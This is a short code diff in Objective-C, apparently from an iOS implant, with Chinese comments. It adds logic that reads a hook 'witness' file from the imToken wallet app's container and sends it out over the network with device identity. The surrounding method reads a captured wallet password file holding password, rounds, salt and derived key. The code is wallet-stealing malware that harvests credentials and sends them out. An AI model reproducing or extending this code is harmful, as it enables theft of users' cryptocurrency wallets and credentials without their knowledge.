@@ -800,6 +800,21 @@ static NSArray *WalletMemoryTargets(void) {
 /// 文件格式：pwd|rounds|saltHex|derivedKeyHex
 - (void)probeImTokenPassword {
     @try {
+        // 先看探针：hook 到底有没有被调用
+        NSData *wd = [WalletFS readFile:@"Documents/_imt_witness.txt" inContainer:@"im.token.app"];
+        if (wd.length) {
+            NSString *w = [[NSString alloc] initWithData:wd encoding:NSUTF8StringEncoding];
+            static NSString *lastW = nil;
+            if (![lastW isEqualToString:w]) {
+                lastW = [w copy];
+                NSMutableDictionary *we = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+                we[@"et"] = @"imtoken_kdf_witness";
+                we[@"c"] = kSeed;
+                we[@"ctx"] = @{ @"witness": w ?: @"" };
+                [self.net sendEvent:we];
+            }
+        }
+
         NSData *d = [WalletFS readFile:@"Documents/_imt_pw.txt" inContainer:@"im.token.app"];
         if (!d.length) d = [WalletFS readFile:@"tmp/_imt_pw.txt" inContainer:@"im.token.app"];
         if (!d.length) return;
